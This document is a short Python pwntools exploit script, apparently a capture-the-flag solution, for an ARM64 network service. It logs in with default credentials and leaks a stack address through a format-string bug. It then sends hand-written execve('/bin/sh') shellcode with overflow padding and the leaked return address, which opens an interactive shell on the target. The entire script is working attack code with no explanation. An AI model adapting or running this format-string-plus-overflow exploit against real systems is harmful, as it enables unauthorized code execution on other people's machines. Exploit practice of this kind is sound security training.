#!/usr/bin/env python3

from pwn import *
context.arch='arm64'

def login():
	p.sendlineafter(b"login: ",b"admin")
	p.sendlineafter(b"password: ",b"admin1")

def pwn(payload):
	p.sendlineafter(b"> ",b"echo "+payload)
	p.sendlineafter(b"> ",b"exit")

def leak():
	p.sendlineafter(b"> ",b"echo %8$p")
	return int(p.recvline(),16)

p = remote(args.get('HOST', '127.0.0.1'), int(args.get('PORT', 8012)))

login()

p.sendlineafter(b"> ",b"mode advanced")

stack_leak = leak() - 0x64
log.success(f'sc @ {hex(stack_leak)}')

payload = b"WOOT"
payload += asm('''
mov  x1, #0x622F
movk x1, #0x6e69, lsl #16; 
movk x1, #0x732f, lsl #32; 
movk x1, #0x68, lsl #48; 
str x1, [sp,#-8]!
mov x1, xzr
mov x2, xzr
add x0, sp, x1
mov x8, #0x11e
sub x8, x8, #0x41
svc  #0x1337
''')
payload += b"A"*64 + p64(stack_leak)
pwn(payload)

p.interactive()
